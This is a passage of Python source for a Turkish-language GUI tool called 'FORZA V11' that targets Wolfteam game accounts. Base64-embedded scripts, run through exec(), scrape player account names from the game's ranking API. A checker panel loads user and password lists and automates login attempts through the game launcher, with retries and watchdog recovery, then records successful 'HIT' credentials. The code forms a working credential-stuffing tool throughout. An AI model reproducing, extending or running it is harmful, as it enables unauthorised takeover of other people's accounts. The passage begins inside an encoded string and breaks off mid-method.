2hvaWNlID0gaW5wdXQoIkthbGTEscSfxLFuIHllcmRlbiBkZXZhbSBldG1layBpc3RpeW9yIG11c3VuPyAoRS9IKTogIikuc3RyaXAoKS5sb3dlcigpDQoNCiAgICBpZiBjaG9pY2UgPT0gImUiOg0KICAgICAgICBzdGFydF9pbmRleCA9IGxhc3RfaW5kZXggLy8gMjANCiAgICBlbHNlOg0KICAgICAgICBzdGFydF9pbmRleCA9IGludChpbnB1dCgiQmHFn2xhbmfEscOnIGluZGV4aW5pIGdpcmluOiAiKSkNCg0KICAgIGZldGNoX2NsYW5fZGF0YShzdGFydF9pbmRleCkNCg0KIyBQcm9ncmFtIGJhxZ9sYXRtYQ0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBtYWluKCkNCg=="
        _NAKITLI_B64 = "aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCgpwcmludCgiIiIKRk9SWkEKIiIiKQoKQkFTRV9VUkwgPSAiaHR0cDovL3dvbGZ0ZWFta2xhbi5qb3lnYW1lLmNvbS9SYW5raW5nL0dldFJhbmtpbmciCkRBVEFfRklMRSA9ICJOQUvEsFRMxLAudHh0IgoKCmRlZiBmZXRjaF9wbGF5ZXJzX3VudGlsX2VtcHR5KHN0YXJ0X2luZGV4LCBsaW1pdCwgcmFua190eXBlPTIsIG9yZGVyX3R5cGU9MSk6CiAgICBjb3VudCA9IDAKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAgICAgIlJhbmtUeXBlIjogcmFua190eXBlLAogICAgICAgICAgICAgICAgIk9yZGVyVHlwZSI6IG9yZGVyX3R5cGUsCiAgICAgICAgICAgICAgICAiU3RhcnRJbmRleCI6IHN0YXJ0X2luZGV4CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KEJBU0VfVVJMLCBwYXJhbXM9cGFyYW1zKQogICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKCiAgICAgICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICAgICAgdXNlcnMgPSBkYXRhLmdldCgiRGF0YSIsIFtdKQoKICAgICAgICAgICAgaWYgbm90IHVzZXJzOgogICAgICAgICAgICAgICAgcHJpbnQoIlZlcmkgYml0dGkuIikKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoKCiAgICAgICAgICAgICAgICBpZiBjb3VudCA+PSBsaW1pdDoKICAgICAgICAgICAgICAgICAgICBwcmludChmIlxuVG9wbGFtIHtsaW1pdH0gSUQgw6dla2lsZGkuIikKICAgICAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgICAgICBhY2NvdW50ID0gdXNlci5nZXQoIkFjY291bnQiLCAiTi9BIikKCiAgICAgICAgICAgICAgICBjb3VudCArPSAxCgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Y291bnR9LiB7YWNjb3VudH0iKQoKICAgICAgICAgICAgICAgIHdpdGggb3BlbihEQVRBX0ZJTEUsICJhIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYie2FjY291bnR9XG4iKQoKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMCkKCiAgICAgICAgICAgIHN0YXJ0X2luZGV4ICs9IDEKCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJBUEkgaXN0ZcSfaSBiYcWfYXLEsXPEsXo6IHtlfSIpCgoKZGVmIG1haW4oKToKICAgIHN0YXJ0X2luZGV4ID0gaW50KGlucHV0KCJCYcWfbGFuZ8Sxw6cgaW5kZXhpbmkgZ2lyaW46ICIpKQogICAgbGltaXQgPSBpbnQoaW5wdXQoIkthw6cgYWRldCBJRCDDp2VraWxzaW4/OiAiKSkKCiAgICBmZXRjaF9wbGF5ZXJzX3VudGlsX2VtcHR5KHN0YXJ0X2luZGV4LCBsaW1pdCkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp"

        self._id_input_queue = _queue.Queue()
        self._id_running = False

        root_frame = ctk.CTkFrame(parent, fg_color="transparent")
        root_frame.pack(fill="both", expand=True)
        root_frame.grid_columnconfigure(0, weight=0, minsize=220)
        root_frame.grid_columnconfigure(1, weight=1)
        root_frame.grid_rowconfigure(0, weight=1)

        # ── SIDEBAR ──
        sidebar = ctk.CTkFrame(root_frame, fg_color=C.SIDEBAR, corner_radius=0, width=220)
        sidebar.grid(row=0, column=0, sticky="nsew")
        sidebar.grid_propagate(False)

        logo_frame = ctk.CTkFrame(sidebar, fg_color="transparent", height=60)
        logo_frame.pack(fill="x", pady=(12, 5))
        logo_frame.pack_propagate(False)
        logo_row = ctk.CTkFrame(logo_frame, fg_color="transparent")
        logo_row.pack(expand=True)
        ctk.CTkLabel(logo_row, text="🔍", font=ctk.CTkFont(size=22)).pack(side="left", padx=(0, 5))
        ctk.CTkLabel(logo_row, text="İD ÇEKME", font=ctk.CTkFont(FN, 16, "bold"),
                     text_color=C.ACCENT).pack(side="left")

        ctk.CTkFrame(sidebar, fg_color=C.BORDER, height=1).pack(fill="x", padx=15, pady=8)
        ctk.CTkLabel(sidebar, text="ARAÇLAR", font=ctk.CTkFont(FN, 9, "bold"),
                     text_color=C.MUTED).pack(anchor="w", padx=15, pady=(6, 10))

        self._id_rutbeli_btn = ctk.CTkButton(
            sidebar, text="🏆  RÜTBELİ",
            fg_color=C.ACCENT, hover_color=C.ACCENT_H,
            font=ctk.CTkFont(FN, 13, "bold"), height=48, corner_radius=8, text_color="white",
            command=lambda: self._id_run_script(_RUTBELI_B64, "RÜTBELİ")
        )
        self._id_rutbeli_btn.pack(fill="x", padx=15, pady=(0, 10))

        self._id_nakitli_btn = ctk.CTkButton(
            sidebar, text="💰  NAKİTLİ",
            fg_color=C.OK_DIM, hover_color=C.OK,
            font=ctk.CTkFont(FN, 13, "bold"), height=48, corner_radius=8, text_color="white",
            command=lambda: self._id_run_script(_NAKITLI_B64, "NAKİTLİ")
        )
        self._id_nakitli_btn.pack(fill="x", padx=15, pady=(0, 6))

        self._id_klan_btn = ctk.CTkButton(
            sidebar, text="\U0001f6e1  KLAN",
            fg_color=C.WARN, hover_color=C.WARN_H,
            font=ctk.CTkFont(FN, 13, "bold"), height=48, corner_radius=8, text_color="white",
            command=lambda: self._id_run_script(_KLAN_B64, "KLAN")
        )
        self._id_klan_btn.pack(fill="x", padx=15, pady=(0, 6))

        self._id_isimmaster_btn = ctk.CTkButton(
            sidebar, text="\U0001f464  İSİMMASTER",
            fg_color="#5b21b6", hover_color="#7c3aed",
            font=ctk.CTkFont(FN, 13, "bold"), height=48, corner_radius=8, text_color="white",
            command=lambda: self._id_run_script(_ISIMMASTER_B64, "İSİMMASTER")
        )
        self._id_isimmaster_btn.pack(fill="x", padx=15, pady=(0, 6))

        self._id_clanmaster_btn = ctk.CTkButton(
            sidebar, text="\U0001f451  CLANMASTER",
            fg_color="#065f46", hover_color="#059669",
            font=ctk.CTkFont(FN, 13, "bold"), height=48, corner_radius=8, text_color="white",
            command=lambda: self._id_run_script(_CLANMASTER_B64, "CLANMASTER")
        )
        self._id_clanmaster_btn.pack(fill="x", padx=15, pady=(0, 6))

        ctk.CTkFrame(sidebar, fg_color=C.BORDER, height=1).pack(fill="x", padx=15, pady=10)

        self._id_stop_btn = ctk.CTkButton(
            sidebar, text="⏹  DURDUR",
            fg_color=C.STOP, hover_color=C.STOP_H,
            font=ctk.CTkFont(FN, 12, "bold"), height=36, corner_radius=8,
            text_color="white", state="disabled", command=self._id_stop
        )
        self._id_stop_btn.pack(fill="x", padx=15, pady=(0, 6))

        ctk.CTkButton(
            sidebar, text="🗑  TEMİZLE",
            fg_color=C.CARD, hover_color=C.CARD_H,
            font=ctk.CTkFont(FN, 12, "bold"), height=36, corner_radius=8,
            text_color=C.GRAY, command=self._id_clear
        ).pack(fill="x", padx=15, pady=(0, 6))

        ctk.CTkFrame(sidebar, fg_color=C.BORDER, height=1).pack(fill="x", padx=15, pady=8)
        self._id_status_lbl = ctk.CTkLabel(sidebar, text="● HAZIR",
                                            font=ctk.CTkFont(FN, 12, "bold"), text_color=C.OK)
        self._id_status_lbl.pack(anchor="w", padx=15)

        # ── SAĞ — GÖMÜLü TERMİNAL ──
        right = ctk.CTkFrame(root_frame, fg_color="transparent")
        right.grid(row=0, column=1, sticky="nsew", padx=6, pady=6)

        term_frame = ctk.CTkFrame(right, fg_color=C.CARD, corner_radius=10,
                                   border_width=1, border_color=C.BORDER)
        term_frame.pack(fill="both", expand=True)

        hdr = ctk.CTkFrame(term_frame, fg_color="transparent", height=32)
        hdr.pack(fill="x", padx=12, pady=(8, 0))
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="►  TERMİNAL",
                     font=ctk.CTkFont(FN, 11, "bold"), text_color=C.GRAY).pack(side="left")

        self._id_term = ctk.CTkTextbox(
            term_frame, fg_color=C.INPUT, border_color=C.BORDER, border_width=1,
            text_color=C.OK, font=ctk.CTkFont(FM, 11), wrap="word", corner_radius=6
        )
        self._id_term.pack(fill="both", expand=True, padx=8, pady=(6, 4))
        self._id_term.configure(state="disabled")

        inp_row = ctk.CTkFrame(term_frame, fg_color="transparent")
        inp_row.pack(fill="x", padx=8, pady=(0, 8))

        ctk.CTkLabel(inp_row, text=">>>", font=ctk.CTkFont(FM, 12, "bold"),
                     text_color=C.ACCENT).pack(side="left", padx=(0, 6))

        self._id_entry = ctk.CTkEntry(
            inp_row, fg_color=C.INPUT, border_color=C.ACCENT, border_width=1,
            text_color=C.WHITE, font=ctk.CTkFont(FM, 11),
            placeholder_text="Buraya yaz, Enter ile gönder...",
            height=32, corner_radius=6
        )
        self._id_entry.pack(side="left", fill="x", expand=True, padx=(0, 6))
        self._id_entry.bind("<Return>", self._id_send_input)

        ctk.CTkButton(
            inp_row, text="Gönder", fg_color=C.ACCENT, hover_color=C.ACCENT_H,
            font=ctk.CTkFont(FN, 11, "bold"), width=70, height=32, corner_radius=6,
            command=self._id_send_input
        ).pack(side="right")

    def _id_term_write(self, text):
        self._id_term.configure(state="normal")
        self._id_term.insert("end", str(text))
        self._id_term.see("end")
        self._id_term.configure(state="disabled")

    def _id_clear(self):
        self._id_term.configure(state="normal")
        self._id_term.delete("1.0", "end")
        self._id_term.configure(state="disabled")

    def _id_stop(self):
        self._id_running = False
        self._id_input_queue.put("__STOP__")
        self._id_status_lbl.configure(text="● DURDURULDU", text_color=C.WARN)
        self._id_stop_btn.configure(state="disabled")
        self._id_rutbeli_btn.configure(state="normal")
        self._id_nakitli_btn.configure(state="normal")
        self._id_klan_btn.configure(state="normal")
        self._id_isimmaster_btn.configure(state="normal")
        self._id_clanmaster_btn.configure(state="normal")

    def _id_send_input(self, event=None):
        val = self._id_entry.get()
        self._id_entry.delete(0, "end")
        self._id_term_write(val + "\n")
        self._id_input_queue.put(val)

    def _id_run_script(self, b64_code, script_name):
        if self._id_running:
            return
        import base64 as _b64, threading, io

        self._id_running = True
        self._id_status_lbl.configure(text="● " + script_name + " ÇALIŞIYOR...", text_color=C.ACCENT)
        self._id_rutbeli_btn.configure(state="disabled")
        self._id_nakitli_btn.configure(state="disabled")
        self._id_klan_btn.configure(state="disabled")
        self._id_isimmaster_btn.configure(state="disabled")
        self._id_clanmaster_btn.configure(state="disabled")
        self._id_stop_btn.configure(state="normal")
        self._id_clear()
        self._id_term_write("=== " + script_name + " BAŞLADI ===\n\n")

        code = _b64.b64decode(b64_code).decode("utf-8")
        q = self._id_input_queue
        app_ref = self
        sname = script_name

        class _FakeStdout(io.IOBase):
            def write(self_, txt):
                app_ref.after(0, app_ref._id_term_write, str(txt))
                return len(txt)
            def flush(self_): pass

        class _FakeInput:
            def __call__(self_, prompt=""):
                app_ref.after(0, app_ref._id_term_write, str(prompt))
                val = q.get()
                if val == "__STOP__":
                    raise KeyboardInterrupt
                return val

        def _worker():
            import builtins, sys
            _old_input  = builtins.input
            _old_stdout = sys.stdout
            _old_stderr = sys.stderr
            try:
                builtins.input = _FakeInput()
                sys.stdout = _FakeStdout()
                sys.stderr = _FakeStdout()
                exec(compile(code, "<embedded>", "exec"), {"__name__": "__main__"})
            except KeyboardInterrupt:
                app_ref.after(0, app_ref._id_term_write, "\n[Durduruldu]\n")
            except Exception as ex:
                app_ref.after(0, app_ref._id_term_write, "\n[HATA]: " + str(ex) + "\n")
            finally:
                builtins.input = _old_input
                sys.stdout = _old_stdout
                sys.stderr = _old_stderr
                app_ref._id_running = False
                app_ref.after(0, lambda: app_ref._id_status_lbl.configure(
                    text="● TAMAMLANDI", text_color=C.OK))
                app_ref.after(0, lambda: app_ref._id_stop_btn.configure(state="disabled"))
                app_ref.after(0, lambda: app_ref._id_rutbeli_btn.configure(state="normal"))
                app_ref.after(0, lambda: app_ref._id_nakitli_btn.configure(state="normal"))
                app_ref.after(0, lambda: app_ref._id_klan_btn.configure(state="normal"))
                app_ref.after(0, lambda: app_ref._id_isimmaster_btn.configure(state="normal"))
                app_ref.after(0, lambda: app_ref._id_clanmaster_btn.configure(state="normal"))
                app_ref.after(0, app_ref._id_term_write, "\n=== " + sname + " BİTTİ ===\n")

        threading.Thread(target=_worker, daemon=True).start()


    def _build_checker_panel(self, parent):
        # ── ROOT CONTAINER ──
        root_frame = ctk.CTkFrame(parent, fg_color="transparent")
        root_frame.pack(fill="both", expand=True)
        root_frame.grid_columnconfigure(0, weight=0, minsize=220)  # sidebar
        root_frame.grid_columnconfigure(1, weight=3)               # merkez
        root_frame.grid_columnconfigure(2, weight=2)               # hit panel
        root_frame.grid_rowconfigure(0, weight=1)

        # ═══════════════════════════════════
        # SOL — SIDEBAR (dosya yükleme + butonlar)
        # ═══════════════════════════════════
        sidebar = ctk.CTkFrame(root_frame, fg_color=C.SIDEBAR, corner_radius=0, width=220)
        sidebar.grid(row=0, column=0, sticky="nsew")
        sidebar.grid_propagate(False)

        # Logo
        logo_frame = ctk.CTkFrame(sidebar, fg_color="transparent", height=60)
        logo_frame.pack(fill="x", pady=(12, 5))
        logo_frame.pack_propagate(False)
        
        logo_row = ctk.CTkFrame(logo_frame, fg_color="transparent")
        logo_row.pack(expand=True)
        ctk.CTkLabel(logo_row, text="⚡", font=ctk.CTkFont(size=22)).pack(side="left", padx=(0, 5))
        ctk.CTkLabel(logo_row, text="FORZA", font=ctk.CTkFont(FN, 18, "bold"), 
                     text_color=C.ACCENT).pack(side="left")
        ctk.CTkLabel(logo_row, text=" V11", font=ctk.CTkFont(FN, 11, "bold"), 
                     text_color=C.OK).pack(side="left")

        # Ayırıcı çizgi
        ctk.CTkFrame(sidebar, fg_color=C.BORDER, height=1).pack(fill="x", padx=15, pady=5)

        # ── DOSYA SEÇİCİ ──
        ctk.CTkLabel(sidebar, text="DOSYA YÜKLEMESİ", font=ctk.CTkFont(FN, 9, "bold"), 
                     text_color=C.MUTED).pack(anchor="w", padx=15, pady=(10, 5))

        self.picker_container = ctk.CTkFrame(sidebar, fg_color="transparent")
        self.picker_container.pack(fill="x", padx=12)
        self._build_combo_picker()

        # Ayırıcı
        ctk.CTkFrame(sidebar, fg_color=C.BORDER, height=1).pack(fill="x", padx=15, pady=12)

        # ── KONTROL BUTONLARI ──
        ctk.CTkLabel(sidebar, text="KONTROL", font=ctk.CTkFont(FN, 9, "bold"), 
                     text_color=C.MUTED).pack(anchor="w", padx=15, pady=(0, 8))

        self.start_btn = ctk.CTkButton(
            sidebar, text="▶  BAŞLAT", fg_color=C.ACCENT, hover_color=C.ACCENT_H,
            font=ctk.CTkFont(FN, 13, "bold"), height=42, corner_radius=8,
            command=self._start, text_color="white"
        )
        self.start_btn.pack(fill="x", padx=15, pady=(0, 6))

        self.stop_btn = ctk.CTkButton(
            sidebar, text="⏹  DURDUR", fg_color=C.STOP, hover_color=C.STOP_H,
            font=ctk.CTkFont(FN, 13, "bold"), height=42, corner_radius=8,
            command=self._stop, state="disabled", text_color="white"
        )
        self.stop_btn.pack(fill="x", padx=15, pady=(0, 6))

        # Ayırıcı
        ctk.CTkFrame(sidebar, fg_color=C.BORDER, height=1).pack(fill="x", padx=15, pady=8)

        # ── DURUM ──
        status_card = ctk.CTkFrame(sidebar, fg_color=C.CARD, corner_radius=8, 
                                    border_width=1, border_color=C.BORDER)
        status_card.pack(fill="x", padx=12, pady=(0, 10))
        
        ctk.CTkLabel(status_card, text="DURUM", font=ctk.CTkFont(FN, 9, "bold"), 
                     text_color=C.MUTED).pack(anchor="w", padx=10, pady=(8, 2))
        self.status_dot = ctk.CTkLabel(status_card, text="● HAZIR", 
                                        font=ctk.CTkFont(FN, 12, "bold"), text_color=C.OK)
        self.status_dot.pack(anchor="w", padx=10, pady=(0, 8))

        # Progress alt bilgi
        sidebar_bottom = ctk.CTkFrame(sidebar, fg_color="transparent")
        sidebar_bottom.pack(side="bottom", fill="x", padx=12, pady=10)
        
        self.pbar = ctk.CTkProgressBar(sidebar_bottom, fg_color=C.BORDER, 
                                        progress_color=C.ACCENT, height=6)
        self.pbar.pack(fill="x", pady=(0, 4))
        self.pbar.set(0)
        self.progress_text = ctk.CTkLabel(sidebar_bottom, text="Hazır", 
                                           font=ctk.CTkFont(FN, 9), text_color=C.MUTED)
        self.progress_text.pack(anchor="w")

        # ═══════════════════════════════════
        # MERKEZ — STATS + LOG
        # ═══════════════════════════════════
        center = ctk.CTkFrame(root_frame, fg_color="transparent")
        center.grid(row=0, column=1, sticky="nsew", padx=6, pady=6)

        # ── STAT KARTLARI ── (2x2 grid)
        stats_grid = ctk.CTkFrame(center, fg_color="transparent")
        stats_grid.pack(fill="x", pady=(0, 8))
        stats_grid.grid_columnconfigure((0, 1), weight=1, uniform="st")
        stats_grid.grid_rowconfigure((0, 1), weight=0)

        self.lbl_total = self._make_stat_card(stats_grid, "📊  TOPLAM", "0", C.WHITE, C.ACCENT_DIM, 0, 0)
        self.lbl_ok    = self._make_stat_card(stats_grid, "🎯  HİT", "0", C.OK, "#003322", 0, 1)
        self.lbl_fail  = self._make_stat_card(stats_grid, "✗  BAŞARISIZ", "0", C.FAIL, "#330022", 1, 0)
        self.lbl_speed = self._make_stat_card(stats_grid, "⚡  HIZ", "—", C.CYAN, "#002233", 1, 1)

        # ── LOG PANELİ ──
        log_frame = ctk.CTkFrame(center, fg_color=C.CARD, corner_radius=10, 
                                  border_width=1, border_color=C.BORDER)
        log_frame.pack(fill="both", expand=True)

        log_header = ctk.CTkFrame(log_frame, fg_color="transparent", height=32)
        log_header.pack(fill="x", padx=12, pady=(8, 0))
        log_header.pack_propagate(False)
        
        ctk.CTkLabel(log_header, text="📋  CANLI LOG", font=ctk.CTkFont(FN, 11, "bold"), 
                     text_color=C.GRAY).pack(side="left")
        
        self._log_visible = True
        self.log_toggle_btn = ctk.CTkButton(
            log_header, text="Gizle", fg_color=C.BORDER, hover_color=C.BORDER_L,
            font=ctk.CTkFont(FN, 9), width=45, height=20, text_color=C.MUTED,
            corner_radius=4, command=self._toggle_log
        )
        self.log_toggle_btn.pack(side="right")

        self.log_box = ctk.CTkTextbox(
            log_frame, fg_color=C.INPUT, border_color=C.BORDER, border_width=1,
            text_color=C.GRAY, font=ctk.CTkFont(FM, 10), wrap="word", corner_radius=6
        )
        self.log_box.pack(fill="both", expand=True, padx=8, pady=8)
        self.log_box.configure(state="disabled")

        # ═══════════════════════════════════
        # SAĞ — HIT LIST PANELİ
        # ═══════════════════════════════════
        hit_panel = ctk.CTkFrame(root_frame, fg_color=C.CARD, corner_radius=10,
                                  border_width=1, border_color=C.BORDER)
        hit_panel.grid(row=0, column=2, sticky="nsew", padx=(0, 6), pady=6)

        # Hit header
        hit_hdr = ctk.CTkFrame(hit_panel, fg_color="transparent", height=42)
        hit_hdr.pack(fill="x", padx=10, pady=(10, 0))
        hit_hdr.pack_propagate(False)
        
        hdr_left = ctk.CTkFrame(hit_hdr, fg_color="transparent")
        hdr_left.pack(side="left")
        ctk.CTkLabel(hdr_left, text="🎯", font=ctk.CTkFont(size=16)).pack(side="left", padx=(0, 5))
        ctk.CTkLabel(hdr_left, text="HIT LIST", font=ctk.CTkFont(FN, 14, "bold"), 
                     text_color=C.OK).pack(side="left")

        self.hit_count_lbl = ctk.CTkLabel(hdr_left, text="0", fg_color=C.ACCENT_DIM, 
                                           corner_radius=10, font=ctk.CTkFont(FN, 11, "bold"), 
                                           text_color=C.WHITE, width=32, height=22)
        self.hit_count_lbl.pack(side="left", padx=8)

        self.copy_btn = ctk.CTkButton(
            hit_hdr, text="📋 Kopyala", fg_color=C.BORDER, hover_color=C.BORDER_L,
            font=ctk.CTkFont(FN, 10), width=80, height=26, corner_radius=6,
            command=self._copy_hits, text_color=C.GRAY
        )
        self.copy_btn.pack(side="right")

        # Ayırıcı
        ctk.CTkFrame(hit_panel, fg_color=C.BORDER, height=1).pack(fill="x", padx=10, pady=8)

        # Hit scroll
        self.hit_scroll = ctk.CTkScrollableFrame(hit_panel, fg_color="transparent", 
                                                  corner_radius=0,
                                                  scrollbar_button_color=C.BORDER,
                                                  scrollbar_button_hover_color=C.BORDER_L)
        self.hit_scroll.pack(fill="both", expand=True, padx=5, pady=(0, 5))

    # ── STAT KART OLUŞTURUCU ──
    def _make_stat_card(self, parent, title, value, color, bg_tint, row, col):
        card = ctk.CTkFrame(parent, fg_color=bg_tint, corner_radius=10, 
                            border_width=1, border_color=C.BORDER, height=72)
        card.grid(row=row, column=col, sticky="nsew", padx=3, pady=3)
        card.grid_propagate(False)
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.place(relx=0.5, rely=0.5, anchor="center")
        
        ctk.CTkLabel(inner, text=title, font=ctk.CTkFont(FN, 9, "bold"), 
                     text_color=C.MUTED).pack()
        lbl = ctk.CTkLabel(inner, text=value, font=ctk.CTkFont(FN, 22, "bold"), 
                           text_color=color)
        lbl.pack(pady=(2, 0))
        return lbl

    # ── DOSYA SEÇİCİ BUILDER ──
    def _build_combo_picker(self):
        for w in self.picker_container.winfo_children():
            w.destroy()

        # Kullanıcı dosyası
        ctk.CTkLabel(self.picker_container, text="👤 Kullanıcı Listesi", 
                     font=ctk.CTkFont(FN, 9, "bold"), text_color=C.GRAY).pack(anchor="w", pady=(0, 3))
        
        u_row = ctk.CTkFrame(self.picker_container, fg_color="transparent")
        u_row.pack(fill="x", pady=(0, 8))
        
        self.user_entry = ctk.CTkEntry(u_row, textvariable=self.usernames_path, fg_color=C.INPUT, 
                                        border_color=C.BORDER, height=28, corner_radius=6, 
                                        font=ctk.CTkFont(FM, 9), placeholder_text="users.txt")
        self.user_entry.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self.browse_user_btn = ctk.CTkButton(u_row, text="📂", fg_color=C.ACCENT, hover_color=C.ACCENT_H, 
                                              width=32, height=28, corner_radius=6, 
                                              command=lambda: self._browse("users"))
        self.browse_user_btn.pack(side="right")

        # Şifre dosyası
        ctk.CTkLabel(self.picker_container, text="🔑 Şifre Listesi", 
                     font=ctk.CTkFont(FN, 9, "bold"), text_color=C.GRAY).pack(anchor="w", pady=(0, 3))
        
        p_row = ctk.CTkFrame(self.picker_container, fg_color="transparent")
        p_row.pack(fill="x", pady=(0, 4))
        
        self.pass_entry = ctk.CTkEntry(p_row, textvariable=self.passwords_path, fg_color=C.INPUT, 
                                        border_color=C.BORDER, height=28, corner_radius=6, 
                                        font=ctk.CTkFont(FM, 9), placeholder_text="passwords.txt")
        self.pass_entry.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self.browse_pass_btn = ctk.CTkButton(p_row, text="📂", fg_color=C.ACCENT, hover_color=C.ACCENT_H, 
                                              width=32, height=28, corner_radius=6, 
                                              command=lambda: self._browse("passes"))
        self.browse_pass_btn.pack(side="right")

    # ── LOG TOGGLE ──
    def _toggle_log(self):
        if self._log_visible:
            self.log_box.pack_forget()
            self._log_visible = False
            self.log_toggle_btn.configure(text="Göster")
        else:
            self.log_box.pack(fill="both", expand=True, padx=8, pady=8)
            self._log_visible = True
            self.log_toggle_btn.configure(text="Gizle")

    # ══════════════════════════════════════════════════
    # FONKSİYONEL METOTLAR (KORUNMUŞ)
    # ══════════════════════════════════════════════════
    def _load_state(self):
        try:
            if os.path.exists(STATE_FILE):
                with open(STATE_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    self.combo_mode.set(data.get("mode", "single"))
                    self.accounts_path.set(data.get("file", ""))
                    self.usernames_path.set(data.get("user_file", ""))
                    self.passwords_path.set(data.get("pass_file", ""))
                    self.last_index = data.get("index", 0)
        except Exception:
            pass

    def _save_state(self, idx):
        try:
            with open(STATE_FILE, "w", encoding="utf-8") as f:
                json.dump({
                    "mode": self.combo_mode.get(),
                    "file": self.accounts_path.get(),
                    "user_file": self.usernames_path.get(),
                    "pass_file": self.passwords_path.get(),
                    "index": idx
                }, f)
        except Exception:
            pass

    _LOG_SHOW_KEYWORDS = (
        "✓", "✗", "BAŞLADI", "TAMAMLANDI", "HATA", "UYARI",
        "WATCHDOG", "başarılı", "BAŞARISIZ", "başlatılıyor",
        "açıldı", "kapandı", "durduruldu", "DEVAM", "TIMEOUT",
    )

    def _import_launcher(self):
        try:
            import launcher
            self._launcher = launcher

            _orig_log = launcher.log
            q = self.msg_queue
            keywords = self._LOG_SHOW_KEYWORDS

            def _patched_log(msg):
                _orig_log(msg)
                try:
                    if any(k in msg for k in keywords):
                        q.put(("log", msg))
                except Exception:
                    pass

            launcher.log = _patched_log
        except Exception as e:
            import traceback
            err_detail = traceback.format_exc()
            print(f"⚠ launcher.py yüklenemedi: {e}\n{err_detail}")
            self.msg_queue.put(("log", f"⚠ launcher.py yüklenemedi: {e}"))

    def _worker(self):
        L = self._launcher
        q = self.msg_queue

        accounts = self._read_accounts_full()

        if not accounts:
            q.put(("log", "HATA: Geçerli hesap kombinasyonu bulunamadı!"))
            q.put(("done",))
            return

        self.n_total = len(accounts)
        q.put(("stats",))

        if self.last_index == 0:
            q.put(("log", "═" * 45))
            q.put(("log", f"OTOMASYON BAŞLADI  —  Toplam {self.n_total} hesap işlenecek"))
            q.put(("log", "═" * 45))
        else:
            q.put(("log", "═" * 45))
            q.put(("log", f"OTOMASYON DEVAM EDİYOR  —  Kaldığı Hesap: {self.last_index + 1}/{self.n_total}"))
            q.put(("log", "═" * 45))

        for idx in range(self.last_index, self.n_total):
            self._last_activity = time.monotonic()

            if idx % 10 == 0 or idx == self.last_index:
                self._save_state(idx)

            user, pwd = accounts[idx]

            if self.stop_event.is_set():
                self.last_index = idx
                self._save_state(idx)
                q.put(("log", f"⏹ Kullanıcı tarafından durduruldu. (Devam Sırası: {idx + 1}. Hesap)"))
                break

            q.put(("progress", idx, self.n_total))

            ok = self._safe_try_login(L, user, pwd, q)

            if ok:
                self.n_ok += 1
                q.put(("hit", user, pwd))
                q.put(("log", f"✓ BAŞARILI GİRİŞ (HIT): {user}"))

                try:
                    L.save_success(user, pwd)
                except Exception:
                    pass

                try:
                    L.close_process(L.WOLFTEAM_EXE)
                    L.kill_launcher()
                    time.sleep(0.15)
                    if idx < len(accounts) - 1 and not self.stop_event.is_set():
                        q.put(("log", "Launcher yeniden başlatılıyor…"))
                        L.start_launcher()
                except Exception as e:
                    q.put(("log", f"Post-login hata: {e}"))

            else:
                self.n_fail += 1

            q.put(("stats",))
            q.put(("progress", idx + 1, self.n_total))
        else:
            self.last_index = 0
            self._save_state(0)

        if self.last_index == 0:
            q.put(("log", ""))
            q.put(("log", "═" * 45))
            q.put(("log", f"TAMAMLANDI  —  🎯 {self.n_ok} HIT BAŞARILI  |  ❌ {self.n_fail} BAŞARISIZ"))
            q.put(("log", "═" * 45))
            q.put(("progress", self.n_total, self.n_total))

        try:
            L._flush_log()
        except Exception:
            pass

        q.put(("done",))

    def _safe_try_login(self, L, user, pwd, q):
        LOGIN_TIMEOUT = 25
        MAX_RETRIES = 2
        
        for attempt in range(MAX_RETRIES):
            result = [None]
            error  = [None]
            t_start = time.monotonic()

            def _run():
                try:
                    result[0] = L.try_login(user, pwd)
                except Exception as e:
                    error[0] = e
                    result[0] = False

            t = threading.Thread(target=_run, daemon=True)
            t.start()
            t.join(timeout=LOGIN_TIMEOUT)

            elapsed = time.monotonic() - t_start

            if t.is_alive():
                if attempt < MAX_RETRIES - 1:
                    q.put(("log", f"⚠ TIMEOUT ({int(elapsed)}sn): {user} — yeniden deneniyor ({attempt+2}/{MAX_RETRIES})"))
                else:
                    q.put(("log", f"⚠ TIMEOUT ({int(elapsed)}sn): {user} — donma kurtarması başlatılıyor"))

                try:
                    L.reset_uia()
                except Exception:
                    pass

                try:
                    L.kill_launcher()
                except Exception:
                    pass

                time.sleep(0.8)

                try:
                    L.start_launcher()
                except Exception:
                    pass
                
                time.sleep(0.5)

                if attempt < MAX_RETRIES - 1:
                    continue
                
                q.put(("log", "🔄 Kurtarma tamamlandı — sonraki hesaba geçiliyor"))
                return False

            if error[0]:
                q.put(("log", f"HATA: {error[0]}"))
                try:
                    L.reset_uia()
                except Exception:
                    pass

            return result[0] if result[0] is not None else False
        
        return False

    def _watchdog(self):
        while True:
            time.sleep(10)
            if not self.is_running:
                self._watchdog_fails = 0
                continue

            elapsed = time.monotonic() - self._last_activity
            if self._last_activity > 0 and elapsed > 30:
                self._watchdog_fails += 1
                self.msg_queue.put(("log", f"⚠ WATCHDOG: {int(elapsed)}sn aktivite tespit edilmedi! (#{self._watchdog_fails})"))

                try:
